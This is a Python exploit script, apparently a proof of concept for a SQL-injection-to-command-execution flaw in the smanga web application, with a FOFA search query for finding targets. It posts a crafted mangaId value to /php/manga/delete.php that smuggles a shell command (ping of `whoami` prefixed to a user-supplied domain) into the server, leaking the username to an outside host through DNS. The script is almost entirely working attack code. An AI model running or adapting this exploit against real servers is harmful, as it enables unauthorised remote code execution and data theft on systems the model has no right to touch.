#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
#fofa: title="smanga"

import os
import json
import time
from urllib import response
from urllib.parse import urljoin
from weakref import proxy
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser
requests.packages.urllib3.disable_warnings()

class EXP:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.verify()  
    
    def banner(self):
        logo = r"""
  ______     _______     ____   ___ ____  _____      _____  __    ___ _____ __   
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ /     |___ / / /_  / _ \___  / /_  
| |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____ |_ \| '_ \| | | | / / '_ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____|__) | (_) | |_| |/ /| (_) |
 \____|  \_/  |_____|   |_____|\___/_____|____/     |____/ \___/ \___//_/  \___/                                                                                  
                                        author： Indra
                                        GitHub： https://github.com/deIndra                 
        """
        print("\033[91m" + logo + "\033[0m")
    
    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=False, type=str, help="Target url(e.g. url.txt)")
        parser.add_argument("-e", "--exp", required=False, type=str, help=f"Target exp(e.g. exp.txt)")
        parser.add_argument("-p", "--proxy", default=None, help="Request Proxy (e.g http://127.0.0.1:8080)")
        return parser.parse_args()
    
    def proxy_server(self):
        proxy = self.args.proxy
        return proxy
     
    def respose(self,url):
        proxy = self.args.proxy
        exp = self.args.exp
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        path = "/php/manga/delete.php"
        url = urljoin(url, path)
        headers = {
            "Content-Length": "360",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "http://127.0.0.1:8181",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": "http://127.0.0.1:8181/php/manga/delete.php",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
        }
        data = '''mangaId=1+union+select+*+from+%28select+1%29a+join+%28select+2%29b+join+%28select+3%29c+join+%28select+4%29d+join+%28select+%27%5C%22%3Bping+-c+3+%60whoami%60.'''+exp+'''%3B%5C%22%27%29e+join+%28select+6%29f+join+%28select+7%29g+join+%28select+8%29h+join+%28select+9%29i+join+%28select+10%29j+join+%28select+11%29k+join+%28select+12%29l%3B&deleteFile=true'''
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=20, verify=False)
            resp = response.text
            return resp             
        except:
            return "conn"  

   
    def verify(self):
            url = self.args.url
            repData = self.respose(url)
            repData_dict = json.loads(repData)
            if "删除成功" in repData_dict["message"]:
                print("[+] 执行成功！！！[✅] url: {}".format(url))
            else:
                print("[x] 未检测到漏洞！[x] url: {}".format(url))
   
    def __del__(self):
        try:
            print("\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe VulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    EXP()
